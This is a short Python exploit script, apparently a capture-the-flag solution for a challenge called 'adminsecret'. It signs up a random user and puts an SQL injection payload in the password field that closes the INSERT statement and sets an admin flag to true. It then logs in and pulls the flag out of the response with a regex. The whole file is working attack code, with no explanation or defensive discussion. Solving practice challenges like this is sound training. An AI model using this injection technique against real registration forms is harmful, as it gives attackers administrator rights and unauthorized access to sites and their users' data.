#!/usr/bin/env python3
import requests
import re
import random
import string

URL_BASE = "http://adminsecret.challs.olicyber.it"

random_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

print(f"Using username: {random_user}")
print("Registering with SQL Injection in password field...")

sql_payload = "mypass123',true)#"
actual_password = "mypass123"

register_data = {
    "username": random_user,
    "password": sql_payload
}

r = requests.post(f"{URL_BASE}/register.php", data=register_data)

if "registrato" in r.text.lower() or "Ti sei registrato" in r.text:
    print("Admin registration successful!")
else:
    print("Registration response:")
    print(r.text[:500])

print(f"Logging in as {random_user}...")

login_data = {
    "username": random_user,
    "password": actual_password
}

r = requests.post(f"{URL_BASE}/login.php", data=login_data)

if "flag{" in r.text:
    match = re.search(r"flag{[^}]*}", r.text)
    if match:
        flag = match.group(0)
        print(f"Flag found: {flag}")
    else:
        print("Flag alert found in response")
        print(r.text)
elif "alert-primary" in r.text:
    print("Logged in as admin!")
    match = re.search(r'alert-primary[^>]*>([^<]*)<', r.text)
    if match:
        print(f"Alert content: {match.group(1)}")
else:
    print("Login failed or no admin access")
    print(r.text[:500])
